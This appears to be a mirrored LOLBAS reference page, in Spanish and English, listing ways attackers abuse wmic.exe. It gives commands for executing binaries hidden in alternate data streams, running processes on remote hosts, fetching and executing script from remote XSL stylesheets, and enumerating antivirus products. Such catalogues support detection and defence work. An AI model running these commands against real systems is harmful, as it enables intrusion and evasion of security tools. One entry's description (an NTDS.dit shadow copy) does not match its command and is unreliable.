# LOLBAS: Wmic.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Copy`, `Execute`

The WMI command-line (WMIC) utility provides a command-line interface for WMI

## Comandos

### Execute binary file hidden in Alternate data streams to evade defensive counter measures

ADS · priv: User · T1564.004

```cmd
wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
```

Execute a .EXE file stored as an Alternate Data Stream (ADS)

### Execute binary from wmic to evade defensive counter measures

Execute · priv: User · T1218

```cmd
wmic.exe process call create "{CMD}"
```

Execute calc from wmic

### Execute binary on a remote system

Execute · priv: User · T1218

```cmd
wmic.exe /node:"192.168.0.1" process call create "{CMD}"
```

Execute evil.exe on the remote system.

### Execute binary on remote system

Execute · priv: User · T1218

```cmd
wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
```

Create a volume shadow copy of NTDS.dit that can be copied.

### Execute script from remote system

Execute · priv: User · T1218

```cmd
wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
```

Executes JScript or VBScript embedded in the target remote XSL stylsheet.

### Copy file.

Copy · priv: User · T1105

```cmd
wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
```

Copy file from source to destination.

### Recon

Execute · priv: User · T1518.001

```cmd
WMIC.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState
```

Executes WMIC to gather the existing Antivirus or EDR solution installed on the machine.

